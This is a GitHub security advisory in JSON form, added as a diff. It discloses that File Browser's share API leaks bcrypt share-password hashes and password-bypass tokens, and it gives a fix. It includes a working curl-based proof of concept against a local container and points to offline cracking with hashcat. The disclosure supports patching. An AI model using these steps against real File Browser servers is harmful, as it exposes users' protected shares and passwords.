@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-833g-cqhp-h72j",
+  "modified": "2026-07-20T22:30:24.166731369Z",
+  "published": "2026-07-20T22:17:56Z",
+  "aliases": [
+    "CVE-2026-62684"
+  ],
+  "summary": "File Browser: Share API exposes the password hash and bypass token",
+  "details": "## Summary\n\nWhen a user creates a password-protected share or lists existing shares, the JSON response includes the full bcrypt `password_hash` and the secret `token` of the share. The `Link` storage struct is serialized directly with `json.Marshal` and tags `password_hash` and `token` for output, with no field filtering. Any authenticated user receives these secrets for their own shares, and an administrator listing all shares via `GET /api/shares` receives the password hash and bypass token for **every** user's shares, enabling offline cracking of share passwords and direct password-bypass access to protected shares.\n\n## Details\n\n**1. The `Link` struct serializes both secrets to JSON (`share/share.go:10-19`)**\n\n```go\ntype Link struct {\n    Hash         string `json:\"hash\" storm:\"id,index\"`\n    Path         string `json:\"path\" storm:\"index\"`\n    UserID       uint   `json:\"userID\"`\n    Expire       int64  `json:\"expire\"`\n    PasswordHash string `json:\"password_hash,omitempty\"`   // line 15, bcrypt hash exposed\n    // Token is only set when PasswordHash is set; it bypasses the password.\n    Token        string `json:\"token,omitempty\"`            // line 19, bypass token exposed\n}\n```\n\n`omitempty` means the hash and token are emitted whenever a share is password-protected, i.e. in every response for such a share.\n\n**2. The share handlers return the full struct through unfiltered `json.Marshal`**\n\n`sharePostHandler` returns the created `Link` with `renderJSON(w, r, s)` (`http/share.go:179`); `shareListHandler` and `shareGetsHandler` return shares the same way (`http/share.go:55`, `http/share.go:76`). `renderJSON` performs an unfiltered `json.Marshal(data)` (`http/utils.go:16`), so every tagged field, including `password_hash` and `token`, reaches the client.\n\n**3. Administrators receive every user's secrets (`http/share.go:36`)**\n\n```go\ns, err = d.store.Share.All()   // admin path: returns ALL users' shares\n// ...\nreturn renderJSON(w, r, s)     // including each share's password_hash and token\n```\n\nAn admin calling `GET /api/shares` receives the bcrypt hash and bypass token for all shares across all users.\n\n## PoC\n\nTested against `filebrowser/filebrowser:v2.63.15`.\n\n**Attack Vector: read the bcrypt hash and bypass token from the share API:**\n\n```bash\n#1. Seed a file in /tmp and start a fresh v2.63.15 container\nmkdir -p /tmp/filebrowser-test/srv/user1\necho \"hello\" \u003e /tmp/filebrowser-test/srv/user1/readme.txt\ndocker run -d --name filebrowser-test -p 8090:80 -v /tmp/filebrowser-test/srv:/srv filebrowser/filebrowser:v2.63.15 \u0026\u0026 sleep 4\nB=http://localhost:8090\n\n#2. Log in as admin\nAP=$(docker logs filebrowser-test 2\u003e\u00261 | grep -o 'password: .*' | awk '{print $2}')\nT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' -d \"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"$AP\\\"}\")\n\n#3. Create a password-protected share\ncurl -s -X POST \"$B/api/share/user1/readme.txt\" -H \"X-Auth: $T\" -H 'Content-Type: application/json' \\\n     -d '{\"password\":\"ShareSecret123!\",\"expires\":\"24\",\"unit\":\"hours\"}'\n\n#4. List shares (as admin this returns every user's shares, each with the bcrypt password_hash and bypass token)\ncurl -s \"$B/api/shares\" -H \"X-Auth: $T\"\n```\n\nThe returned bcrypt hash cracks offline (`hashcat -m 3200`) to recover the share password, and the `token` opens the protected share directly without the password.\n\nExpected output (reproduced on a fresh `filebrowser-test` container, v2.63.15):\n\nBoth the `POST /api/share/...` response and the `GET /api/shares` response return HTTP 200 with a body that includes the full bcrypt `password_hash` and the 128-character bypass `token`:\n\n```http\nPOST /api/share/user1/readme.txt   -\u003e 200\nGET  /api/shares                   -\u003e 200\n{\n  \"hash\": \"yy9159Cs\",\n  \"path\": \"/user1/readme.txt\",\n  \"userID\": 1,\n  \"expire\": 1781758642,\n  \"password_hash\": \"$2a$10$SX2h.eKiqMaThRTJNIKVxeVkbXSbGf5XoU0ZX2frcAasjE4RbvBla\",\n  \"token\": \"bO4YpOtayjDNG_72qYk6MHIIn0BNxskySLSAbinAkPcKZX6XD2rRrtDX8Bmro...\"\n}\n```\n\nThe hash cracks offline to the known password (`bcrypt.checkpw(b\"ShareSecret123!\", hash) == True`, `hashcat -m 3200`), and the `token` grants direct access to the password-protected share without knowing the password.\n\n## Impact\n\n- **Offline password cracking:** the bcrypt hash of every password-protected share is returned to clients; weak or reused share passwords can be recovered offline.\n- **Password-bypass token leak:** the `token` is the value that bypasses the share password entirely; exposing it in list responses lets any holder of the response open the protected share directly.\n- **Admin sees everyone's secrets:** `GET /api/shares` as an administrator returns the hash and token of every user's shares, broadening the exposure across all tenants.\n- **Credential reuse risk:** users who reuse an account or service password as a share password expose that password to offline recovery.\n\n## Recommended Fix\n\nNever serialize the hash or the bypass token to clients. Change the JSON tags so the secrets stay server-side:\n\n```go\n// share/share.go\ntype Link struct {\n    Hash         string `json:\"hash\" storm:\"id,index\"`\n    Path         string `json:\"path\" storm:\"index\"`\n    UserID       uint   `json:\"userID\"`\n    Expire       int64  `json:\"expire\"`\n    PasswordHash string `json:\"-\" storm:\"index\"`   // never serialize\n    Token        string `json:\"-\"`                 // never serialize in list responses\n}\n```\n\n`PasswordHash` and `Token` are only needed server-side (for `bcrypt.CompareHashAndPassword` and token comparison during share authentication). If a client needs to know whether a share is password-protected, expose a derived `HasPassword bool` instead of the hash. Prefer a response DTO over serializing the storage struct directly so future field additions are not exposed by default.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/filebrowser/filebrowser/v2",
+        "purl": "pkg:golang/github.com/filebrowser/filebrowser/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.63.17"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.63.16",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-833g-cqhp-h72j/GHSA-833g-cqhp-h72j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-833g-cqhp-h72j"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/filebrowser/filebrowser"
+    }
+  ]
+}
